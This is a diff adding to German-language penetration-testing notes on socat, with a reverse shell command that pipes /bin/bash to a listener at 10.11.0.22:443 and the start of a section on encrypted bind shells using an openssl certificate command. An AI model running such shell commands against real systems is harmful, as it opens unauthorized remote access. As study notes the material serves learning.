@@ -16,4 +16,23 @@ Mit #Socat können auch #Reverseshells eröffnet werden.
 Auf dem Host
 ```socat -d -d TCP4-LISTEN:443 STDOUT```
 
-Auf dem
+Mit dem Angreifer PC folgende #Reverseshell spawnen
+
+```socat TCP4:10.11.0.22:443 EXEC:/bin/bash```
+
+## Socat Encrypted Bind Shells
+
+Mit #Socat können #Ecrypted #BindShells erstellt werden. 
+Dazu geht man wie folgt vor:
+
+`openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`
+
+-   req: initiate a new certificate signing request
+-   -newkey: generate a new private key
+-   rsa:2048: use RSA encryption with a 2,048-bit key length.
+-   -nodes: store the private key without passphrase protection
+-   -keyout: save the key to a file
+-   -x509: output a self-signed certificate instead of a certificate request
+-   -days: set validity period in days
+-   -out: save the certificate to a file
+
